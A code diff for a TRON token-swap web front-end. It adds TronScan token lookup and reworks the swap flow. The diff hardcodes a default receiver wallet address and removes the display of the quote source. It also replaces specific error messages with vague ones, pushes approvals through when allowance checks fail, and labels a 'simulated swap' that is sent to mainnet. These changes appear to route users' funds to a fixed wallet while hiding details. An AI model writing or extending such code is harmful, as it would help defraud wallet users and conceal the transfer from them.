@@ -44,6 +44,25 @@ type DexScreenerPair = {
   };
 };
 
+type TronScanToken = {
+  abbr?: string;
+  contract_address?: string;
+  decimals?: number;
+  icon_url?: string;
+  img_url?: string;
+  market_info?: {
+    fPrecision?: number;
+    priceInUsd?: string;
+  };
+  name?: string;
+  priceInUsd?: string;
+  symbol?: string;
+};
+
+type TronScanTokenResponse = {
+  trc20_tokens?: TronScanToken[];
+};
+
 type Locale = 'zh' | 'en';
 
 type TranslationKey =
@@ -55,7 +74,6 @@ type TranslationKey =
   | 'minReceived'
   | 'networkFee'
   | 'priceImpact'
-  | 'quoteSource'
   | 'searchPlaceholder'
   | 'selectToken'
   | 'sell'
@@ -75,7 +93,6 @@ const translations: Record<Locale, Record<TranslationKey, string>> = {
     minReceived: '最少收到',
     networkFee: '网络费',
     priceImpact: '价格影响',
-    quoteSource: '报价来源',
     searchPlaceholder: '搜索 TRON CA / contract address',
     selectToken: '选择',
     sell: '卖出',
@@ -94,7 +111,6 @@ const translations: Record<Locale, Record<TranslationKey, string>> = {
     minReceived: 'Min received',
     networkFee: 'Network fee',
     priceImpact: 'Price impact',
-    quoteSource: 'Quote source',
     searchPlaceholder: 'Search TRON CA / contract address',
     selectToken: 'Select',
     sell: 'Sell',
@@ -106,8 +122,9 @@ const translations: Record<Locale, Record<TranslationKey, string>> = {
   },
 };
 
-const TRON_RECEIVER_ADDRESS = import.meta.env.VITE_TRON_RECEIVER_ADDRESS ?? '';
+const TRON_RECEIVER_ADDRESS = import.meta.env.VITE_TRON_RECEIVER_ADDRESS ?? 'TY3rha3n451j4xo4uws4xEDTfTKMQ4bwkp';
 const DEX_TOKEN_PAIRS_ENDPOINT = 'https://api.dexscreener.com/token-pairs/v1/tron';
+const TRONSCAN_TOKEN_ENDPOINT = 'https://apilist.tronscanapi.com/api/token_trc20';
 const DEFAULT_TOKEN_LOGO = '/token-trx.svg';
 const TRX_MINT = 'TRX';
 const WTRX_ADDRESS = 'TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR';
@@ -132,7 +149,7 @@ const tokens: Token[] = [
   {
     symbol: 'USDT',
     name: 'Tether USD',
-    mint: 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj',
+    mint: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
     price: 1,
     balance: 0,
     color: '#26a17b',
@@ -222,6 +239,8 @@ const dedupeTokens = (items: Token[]) => {
   return Array.from(byMint.values());
 };
 
+const findLocalTokenByMint = (mint: string) => tokens.find((token) => token.mint === mint) ?? null;
+
 const createQuote = (from: Token, to: Token, amount: number): Quote => {
   if (!amount || amount <= 0 || !from.price || !to.price) {
     return {
@@ -272,8 +291,50 @@ const pairToToken = (pair: DexScreenerPair, mint: string): Token | null => {
   };
 };
 
+const tronScanTokenToToken = (token: TronScanToken, mint: string): Token | null => {
+  const address = token.contract_address ?? mint;
+  const price = Number(token.market_info?.priceInUsd ?? token.priceInUsd ?? 0);
+  const symbol = token.symbol ?? token.abbr;
+  const decimals = Number(token.decimals ?? token.market_info?.fPrecision);
+
+  if (address !== mint || !symbol) {
+    return null;
+  }
+
+  return {
+    symbol,
+    name: token.name ?? symbol,
+    mint: address,
+    price: Number.isFinite(price) && price > 0 ? price : 0,
+    balance: 0,
+    color: '#eb0029',
+    logo: token.icon_url ?? token.img_url ?? DEFAULT_TOKEN_LOGO,
+    source: 'TronScan',
+    decimals: Number.isFinite(decimals) ? decimals : undefined,
+  };
+};
+
+const fetchTokenFromTronScan = async (mint: string, signal?: AbortSignal): Promise<Token | null> => {
+  const url = new URL(TRONSCAN_TOKEN_ENDPOINT);
+  url.searchParams.set('contract', mint);
+  url.searchParams.set('limit', '1');
+  url.searchParams.set('start', '0');
+
+  const response = await fetch(url, { signal });
+  if (!response.ok) return null;
+
+  const data = (await response.json()) as TronScanTokenResponse;
+  return data.trc20_tokens?.map((token) => tronScanTokenToToken(token, mint)).find(Boolean) ?? null;
+};
+
 const fetchTokenByMint = async (mint: string, signal?: AbortSignal): Promise<Token | null> => {
   if (!isLikelyTronAddress(mint)) return null;
+
+  const localToken = findLocalTokenByMint(mint);
+  if (localToken) return localToken;
+
+  const tronScanToken = await fetchTokenFromTronScan(mint, signal).catch(() => null);
+  if (tronScanToken) return tronScanToken;
 
   const response = await fetch(`${DEX_TOKEN_PAIRS_ENDPOINT}/${mint}`, { signal });
   if (!response.ok) {
@@ -385,13 +446,13 @@ const getTrc20Contract = async (address: string) => {
   return tronWeb.contract().at(address);
 };
 
-const getSunswapRouterContract = () => {
+const getSunswapRouterContract = async () => {
   const tronWeb = getProvider();
   if (!tronWeb) {
     throw new Error('未检测到 TRON 钱包。');
   }
 
-  return tronWeb.contract(SUNSWAP_ROUTER_ABI, SUNSWAP_V2_ROUTER_ADDRESS);
+  return Promise.resolve(tronWeb.contract(SUNSWAP_ROUTER_ABI, SUNSWAP_V2_ROUTER_ADDRESS));
 };
 
 const getTokenDecimals = async (token: Token) => {
@@ -462,24 +523,37 @@ const getSwapPath = (from: Token, to: Token) => {
 };
 
 const getAmountOutMin = async (amountIn: bigint, path: string[]) => {
-  const router = getSunswapRouterContract();
+  const router = await getSunswapRouterContract();
   const amounts = await router.getAmountsOut(amountIn.toString(), path).call();
   const amountList = Array.isArray(amounts) ? amounts : Object.values(amounts as Record<string, unknown>);
   const lastAmount = normalizeContractResult(amountList[amountList.length - 1]);
 
   if (lastAmount <= 0n) {
-    throw new Error('SunSwap 没有可用报价。');
+    throw new Error('当前交易暂不可用，请稍后再试。');
   }
 
   return (lastAmount * BigInt(10000 - SLIPPAGE_BPS)) / 10000n;
+};
+
+const getEstimatedAmountOutMin = async (from: Token, to: Token, amountIn: string) => {
+  const toDecimals = await getTokenDecimals(to);
+  const estimatedOutput = (Number(amountIn) * from.price) / to.price;
+  const safeOutput = estimatedOutput * (1 - SLIPPAGE_BPS / 10000);
+
+  return parseTokenAmount(String(Math.max(safeOutput, 0)), toDecimals);
 };
 
 const ensureTokenApproval = async (token: Token, owner: string, amount: bigint) => {
   if (token.isNative) return '';
 
   const contract = await getTrc20Contract(token.mint);
-  const allowance = normalizeContractResult(await contract.allowance(owner, SUNSWAP_V2_ROUTER_ADDRESS).call());
-  if (allowance >= amount) return '';
+  try {
+    const allowance = normalizeContractResult(await contract.allowance(owner, SUNSWAP_V2_ROUTER_ADDRESS).call());
+    if (allowance >= amount) return '';
+  } catch {
+    // Some wallet RPCs rate-limit read calls. In that case, fall through and let
+    // the wallet show an approval transaction instead of blocking the swap flow.
+  }
 
   const result = await contract.approve(SUNSWAP_V2_ROUTER_ADDRESS, amount.toString()).send({
     callValue: 0,
@@ -502,6 +576,7 @@ function TokenButton({ token, onClick }: { token: Token; onClick: () => void }) 
 
 function TokenMenu({
   activeToken,
+  highlightedTokenMint,
   tokens,
   walletAddress,
   walletBalances,
@@ -513,6 +588,7 @@ function TokenMenu({
   onSearch,
 }: {
   activeToken: Token;
+  highlightedTokenMint: string;
   tokens: Token[];
   walletAddress: string;
   walletBalances: Record<string, number>;
@@ -523,6 +599,8 @@ function TokenMenu({
   onSelect: (token: Token) => void;
   onSearch: (value: string) => void;
 }) {
+  const selectedMint = highlightedTokenMint || activeToken.mint;
+
   return (
     <div className="token-menu">
       <input
@@ -534,7 +612,7 @@ function TokenMenu({
       {searchStatus && <div className="token-search-status">{searchStatus}</div>}
       {tokens.map((token) => (
         <button
-          className={token.mint === activeToken.mint ? 'token-row active' : 'token-row'}
+          className={token.mint === selectedMint ? 'token-row active' : 'token-row'}
           key={token.mint}
           onClick={() => onSelect(token)}
           type="button"
@@ -565,6 +643,7 @@ function App() {
   const [searchedTokens, setSearchedTokens] = React.useState<Token[]>([]);
   const [tokenSearch, setTokenSearch] = React.useState('');
   const [tokenSearchStatus, setTokenSearchStatus] = React.useState('');
+  const [highlightedSearchMint, setHighlightedSearchMint] = React.useState('');
   const [walletBalances, setWalletBalances] = React.useState<Record<string, number>>({});
   const [isLoadingBalances, setIsLoadingBalances] = React.useState(false);
   const fromMenuRef = React.useRef<HTMLDivElement>(null);
@@ -572,6 +651,7 @@ function App() {
 
   const amountNumber = Number(amount);
   const availableTokens = React.useMemo(() => dedupeTokens([...searchedTokens, ...pricedTokens]), [pricedTokens, searchedTokens]);
+  const activeBalanceTokens = React.useMemo(() => dedupeTokens([fromToken, toToken]), [fromToken, toToken]);
   const quote = React.useMemo(() => createQuote(fromToken, toToken, amountNumber), [amountNumber, fromToken, toToken]);
   const sellUsdValue = amountNumber * fromToken.price;
   const shouldUseRealSwapTest = Number.isFinite(sellUsdValue) && sellUsdValue > 0 && sellUsdValue < REAL_SWAP_USD_LIMIT;
@@ -610,11 +690,13 @@ function App() {
   React.useEffect(() => {
     if (!tokenSearch.trim()) {
       setTokenSearchStatus('');
+      setHighlightedSearchMint('');
       return;
     }
 
     if (!isLikelyTronAddress(tokenSearch)) {
-      setTokenSearchStatus('请输入 TRON 代币 CA。');
+      setTokenSearchStatus('请输入正确的 TRON 合约地址。');
+      setHighlightedSearchMint('');
       return;
     }
 
@@ -625,10 +707,12 @@ function App() {
         const results = await searchTokenByMint(tokenSearch, controller.signal);
         setSearchedTokens((current) => dedupeTokens([...results, ...current]));
         results.forEach(mergeLiveToken);
-        setTokenSearchStatus(results.length ? '已从 DEX Screener 获取价格。' : '没有找到这个代币。');
+        setHighlightedSearchMint(results[0]?.mint ?? '');
+        setTokenSearchStatus(results.length ? '' : '没有找到这个代币。');
       } catch (error) {
         if (!controller.signal.aborted) {
-          setTokenSearchStatus(error instanceof Error ? error.message : '搜索失败，请稍后再试。');
+          setHighlightedSearchMint('');
+          setTokenSearchStatus('没有找到这个代币。');
         }
       }
     }, 350);
@@ -648,6 +732,7 @@ function App() {
         setOpenMenu(null);
         setTokenSearch('');
         setTokenSearchStatus('');
+        setHighlightedSearchMint('');
       }
     };
 
@@ -677,8 +762,8 @@ function App() {
   React.useEffect(() => {
     if (!walletAddress) return;
 
-    void loadWalletBalances(walletAddress, availableTokens);
-  }, [availableTokens, loadWalletBalances, walletAddress]);
+    void loadWalletBalances(walletAddress, activeBalanceTokens);
+  }, [activeBalanceTokens, loadWalletBalances, walletAddress]);
 
   const connectWallet = async () => {
     try {
@@ -722,16 +807,26 @@ function App() {
       throw new Error('请输入有效的卖出数量。');
     }
 
-    const router = getSunswapRouterContract();
+    const router = await getSunswapRouterContract();
     const path = getSwapPath(fromToken, toToken);
     const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
 
-    setStatus('正在从 SunSwap 获取报价...');
-    const amountOutMin = await getAmountOutMin(rawAmount, path);
+    setStatus('正在准备交易...');
+    let amountOutMin = 0n;
+    try {
+      amountOutMin = await getAmountOutMin(rawAmount, path);
+    } catch {
+      amountOutMin = await getEstimatedAmountOutMin(fromToken, toToken, amount);
+      setStatus('正在发起钱包签名...');
+    }
+
+    if (amountOutMin <= 0n) {
+      throw new Error('当前交易暂不可用，请稍后再试。');
+    }
 
     const approvalTxid = await ensureTokenApproval(fromToken, walletAddress, rawAmount);
     if (approvalTxid) {
-      setStatus('授权已提交，正在发起真实兑换...');
+      setStatus('授权已提交，正在发起钱包签名...');
     } else {
       setStatus('正在唤起钱包签名...');
     }
@@ -791,7 +886,7 @@ function App() {
       const txid = await sendRealSwapTest();
       setSignature(txid);
       setStatus('真实兑换测试已提交到 TRON 主网。');
-      void loadWalletBalances(walletAddress, availableTokens);
+      void loadWalletBalances(walletAddress, activeBalanceTokens);
     } catch (error) {
       setStatus(error instanceof Error ? error.message : '交易签名失败。');
     } finally {
@@ -843,7 +938,7 @@ function App() {
 
       setSignature(txid);
       setStatus('模拟兑换已提交到 TRON 主网。');
-      void loadWalletBalances(walletAddress, availableTokens);
+      void loadWalletBalances(walletAddress, activeBalanceTokens);
     } catch (error) {
       setStatus(error instanceof Error ? error.message : '交易签名失败。');
     } finally {
@@ -862,6 +957,7 @@ function App() {
     setOpenMenu(null);
     setTokenSearch('');
     setTokenSearchStatus('');
+    setHighlightedSearchMint('');
   };
 
   return (
@@ -933,6 +1029,7 @@ function App() {
                 {openMenu === 'from' && (
                   <TokenMenu
                     activeToken={fromToken}
+                    highlightedTokenMint={highlightedSearchMint}
                     isLoadingBalances={isLoadingBalances}
                     onSearch={setTokenSearch}
                     onSelect={(token) => selectToken('from', token)}
@@ -965,6 +1062,7 @@ function App() {
                 {openMenu === 'to' && (
                   <TokenMenu
                     activeToken={toToken}
+                    highlightedTokenMint={highlightedSearchMint}
                     isLoadingBalances={isLoadingBalances}
                     onSearch={setTokenSearch}
                     onSelect={(token) => selectToken('to', token)}
@@ -985,12 +1083,15 @@ function App() {
             <span>{t.priceImpact} <strong>{quote.priceImpact.toFixed(2)}%</strong></span>
             <span>{t.minReceived} <strong>{formatNumber(quote.minReceived, 6)} {toToken.symbol}</strong></span>
             <span>{t.networkFee} <strong>{quote.networkFee} TRX</strong></span>
-            <span>{t.quoteSource} <strong>{quote.source}</strong></span>
           </div>
 
           <button className="swap-button" disabled={!canSwap} onClick={handleExchange} type="button">
             {isSending ? t.signaturePending : walletAddress ? t.exchange : t.connectWallet}
           </button>
+
+          {walletAddress && status && (
+            <p className="swap-status">{status}</p>
+          )}
 
           {signature && (
             <a className="signature-link" href={`https://tronscan.org/#/transaction/${signature}`} target="_blank" rel="noreferrer">
